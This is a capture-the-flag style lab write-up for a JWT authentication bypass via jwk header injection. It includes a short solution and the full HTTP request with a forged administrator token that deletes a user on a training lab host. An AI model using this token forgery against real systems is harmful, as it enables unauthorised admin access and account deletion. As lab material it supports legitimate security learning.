# Lab: JWT authentication bypass via jwk header injection
## LAB DESC
```
This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```
## SOLUTION
So in this we had to make our custom `jwk` which the vulnerable server used as the key as instead of the one already configured.  
I generated a new RSA key of my own and use it to sign the malicious payload as I wished. I changed the `kid` to the same one as the forged `jwk` field and escalated the server to get admin privileges.  
Just run the og method to delete our friend _Carlos_ from the admin panel.
## REQUEST BODY

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0a83002a04fbd736812c574100ad0041.web-security-academy.net
Cookie: session=eyJraWQiOiI4YzZkMjJkZi01YTI3LTRiMmItYmI3OS0zODgyNTg5ZTBlMWUiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjhjNmQyMmRmLTVhMjctNGIyYi1iYjc5LTM4ODI1ODllMGUxZSIsIm4iOiJ1MVNVMUxmVkxQSENvek14SDJNbzRsZ09FZVB6Tm0wdFJnZUxlelY2ZmZBdDBndW5WVEx3N29uTFJucnEwX0l6Vzd5V1I3UWtybUJMN2pUS0VuNXUtcUtoYndLZkJzdElzLWJNWTJaa3AxOGduVHhLTHhvUzJ0RmN6R2tQTFBnaXpza3VlbU1naFJuaVdhb0xjeWVoa2QzcXFHRWx2V19WREw1QWFXVGcwbkxWa2pSbzl6LTQwUlF6dVZhRThBa0FGbXhaem93M3gtVkpZS2RqeWtrSjBpVDl3Q1MwRFJUWHUyNjlWMjY0VmZfM2p2cmVkWmlLUmtnd2xMOXhOQXd4WEZnMHhfWEZ3MDA1VVdWUklrZGdjS1dUanBCUDJkUHdWWjRXV0MtOWFHVmQtR3luMW8wQ0xlbGY0ckVqR29YYkFBRWdBcWVHVXhyY0lsYmpYZmJjbXcifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjM1OTcyOSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.OlR_pZHhNAgaX7VRUSfwuGPzWo125tEJDDRd_I8YJlD9PG_IeRx5PqIcmp09vsh1k-9TTV04GQF9hMEITuEo88lg2xWT1F1tQqnP-2SpG1_GqpAqqTw3bMUCCCL4OkVIg30R2Vsnm5jp3-zEL4NbEnLxWZfq66WG_fm0t8R-YLofVTBkufRnM8YeJOt7lODMX0muDYO3JcMOMwHoWIWNwUQefqV-li0Pj4AUUrC6JRgHGmFX_JlvTHfBGLTaEJ8GOaF-HtJowmlfTc8Eh6BrTxWl7BNbJc9KXmVZX2p0lQzWWOiZtmrx8abdIiaq-GD5ZJSgHyMkYmHM5Eq3YLwWHA
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a83002a04fbd736812c574100ad0041.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```
> LAB SOLVED!
